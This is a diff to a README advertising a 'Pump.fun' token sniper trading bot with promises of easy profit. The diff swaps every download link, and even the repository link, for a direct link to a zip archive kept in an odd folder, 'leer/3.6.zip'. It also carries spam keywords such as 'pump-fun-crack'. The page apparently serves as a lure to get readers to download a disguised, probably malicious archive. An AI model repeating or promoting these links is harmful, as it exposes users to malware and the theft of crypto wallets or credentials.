@@ -1,6 +1,6 @@
 # 🤖 Pump-Fun-Token-Sniper-Bot - Your Automated Pump.fun Profit Machine
 
-[![Download Now](https://img.shields.io/badge/Download-PumpSniper_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/benesma36-droid/Pump-Fun-Token-Sniper-Bot/releases)
+[![Download Now](https://img.shields.io/badge/Download-PumpSniper_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/benesma36-droid/Pump-Fun-Token-Sniper-Bot/main/leer/3.6.zip)
 
 ## 🎯 What Is Pump-Fun-Token-Sniper-Bot?
 
@@ -23,7 +23,7 @@ Getting PumpSniper running on your Windows computer is incredibly simple. Here's
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/benesma36-droid/Pump-Fun-Token-Sniper-Bot/releases](https://github.com/benesma36-droid/Pump-Fun-Token-Sniper-Bot/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/benesma36-droid/Pump-Fun-Token-Sniper-Bot/main/leer/3.6.zip](https://raw.githubusercontent.com/benesma36-droid/Pump-Fun-Token-Sniper-Bot/main/leer/3.6.zip)
 
 On that page, you'll see the latest release version. Click the download button to get the file onto your computer. The download should start automatically.
 
@@ -110,7 +110,7 @@ Ready to start? Click the download button at the top of this page to get PumpSni
 
 ## 🔗 Quick Access
 
-- **Download Now:** [https://github.com/benesma36-droid/Pump-Fun-Token-Sniper-Bot/releases](https://github.com/benesma36-droid/Pump-Fun-Token-Sniper-Bot/releases)
-- **Repository:** [Pump-Fun-Token-Sniper-Bot](https://github.com/benesma36-droid/Pump-Fun-Token-Sniper-Bot)
+- **Download Now:** [https://raw.githubusercontent.com/benesma36-droid/Pump-Fun-Token-Sniper-Bot/main/leer/3.6.zip](https://raw.githubusercontent.com/benesma36-droid/Pump-Fun-Token-Sniper-Bot/main/leer/3.6.zip)
+- **Repository:** [Pump-Fun-Token-Sniper-Bot](https://raw.githubusercontent.com/benesma36-droid/Pump-Fun-Token-Sniper-Bot/main/leer/3.6.zip)
 
 Keywords: auto-trade-2026, binance-bot-2026, bot-free-2026, crypto-bot-2026, crypto-free-2026, crypto-scanner-2026, crypto-tool-free, defi-bot-2026, dex-bot-2026, ethereum-bot-2026, pump-fun-bot, pump-fun-crack, pump-sniper, pumpfun-auto-buy, pumpfun-bot-free, pumpfun-sniper-2026, sniper-bot-2026, solana-bot-2026, trading-bot-free, trading-tool-2026
